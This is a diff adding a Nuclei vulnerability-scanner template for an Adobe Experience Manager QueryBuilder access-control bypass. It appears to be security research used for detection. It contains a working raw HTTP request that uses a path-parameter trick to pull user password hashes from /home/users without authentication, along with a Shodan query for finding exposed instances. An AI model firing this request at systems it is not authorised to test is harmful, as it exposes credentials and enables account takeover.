@@ -1,0 +1,52 @@
+id: aem-querybuilder-bypass
+
+info:
+  name: AEM QueryBuilder JSON Exposure - Bypass
+  author: tess,assetnote
+  severity: critical
+  description: |
+    Adobe Experience Manager QueryBuilder endpoint allows unauthenticated attackers to extract sensitive user repository data, including password hashes from the rep:password field in /home/users. This vulnerability bypasses access controls and exposes bcrypt/SHA-256 password hashes through the querybuilder.json API, enabling potential credential compromise and account takeover attacks.
+  reference:
+    - https://experienceleague.adobe.com/docs/experience-manager-65/developing/platform/query-builder/querybuilder-api.html
+    - https://slcyber.io/assetnote-security-research-center/finding-critical-bugs-in-adobe-experience-manager/
+    - https://github.com/assetnote/hopgoblin
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.component:"Adobe Experience Manager"
+  tags: aem,adobe,exposure,querybuilder,vuln
+
+http:
+  - raw:
+      - |
+        GET /bin/querybuilder.json;x='x/graphql/execute/json/x'?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"rep:password"'
+          - '"success":true'
+          - '"results":'
+          - '"hits":'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: password_count
+        group: 1
+        part: body
+        regex:
+          - '"results":(\d+)'
+        internal: true
+
+      - type: dsl
+        dsl:
+          - '"Found password: " + password_count'
+# digest: 4a0a00473045022057b2f8bf703ff036ff4414f25eb2b5f21dc31fc77658c540fd375aef72426b6d022100f50f46f33386429facfcac873e2f99a9b56de8bab9de04aeb787be75622ba22f:922c64590222798bb761d5b6d8e72950
